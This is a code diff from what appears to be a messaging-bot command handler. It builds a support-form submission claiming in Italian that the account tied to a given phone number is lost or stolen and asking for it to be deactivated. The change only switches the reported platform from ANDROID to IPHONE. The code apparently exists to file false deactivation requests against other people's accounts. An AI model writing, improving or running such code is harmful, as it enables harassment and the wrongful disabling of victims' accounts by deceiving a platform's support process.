@@ -20,7 +20,7 @@ let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
     form.append("phone_number", q)
     form.append("email", email.data[0])
     form.append("email_confirm", email.data[0])
-    form.append("platform", "ANDROID")
+    form.append("platform", "IPHONE")
     form.append("your_message", "Perso/rubato: disattiva il mio account: " + q)
     form.append("__user", "0")
     form.append("__a", "1")
